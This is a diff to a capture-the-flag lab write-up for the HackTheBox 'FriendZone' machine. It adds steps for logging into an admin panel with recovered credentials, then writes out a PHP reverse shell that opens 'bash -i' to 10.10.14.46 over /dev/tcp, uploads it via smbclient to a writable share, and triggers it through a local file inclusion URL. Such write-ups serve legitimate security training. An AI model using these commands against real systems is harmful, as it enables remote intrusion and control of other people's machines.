@@ -99,7 +99,11 @@ friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604
 New domains. Put these in the /etc/hosts file:
 ```
 hr.friendzone.red
+```
+```
 uploads.friendzone.red
+```
+```
 administrator1.friendzone.red
 ```
 
@@ -170,4 +174,54 @@ admin
 ```
 WORKWORKHhallelujah@#
 ```
+
+### Logging In
+
+Go to https://administrator1.friendzone.red and use the above credentials 
+
+![[Pasted image 20240122150519.png]]
+
+**dashboard.php**
+
+![[Pasted image 20240122151011.png]]
+
+![[Pasted image 20240122154506.png]]
+
+Reading the message, we get the pagename `timestamp`
+
+**timestamp**
+
+![[Pasted image 20240122155040.png]]
+
+### Reverse Shell
+
+- Earlier we came across a share called `Development` that had READ/WRITE access.
+- Create a reverse shell by logging in with the creds found in the `general` share
+
+**PHP Reverse Shell**
+```bash
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.46/9999 0>&1'");?>
+```
+
+
+**Upload the r_shell file**
+
+```
+smbclient \\\\10.10.10.123\\Development -U admin
+
+Password for [WORKGROUP\admin]:
+Try "help" to get a list of possible commands.
+smb: \> put r_shell
+putting file r_shell as \r_shell (1.0 kb/s) (average 1.0 kb/s)
+smb: \> 
+```
+
+**Execute Reverse Shell**
+
+```
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/r_shell
+```
+
+
+
 
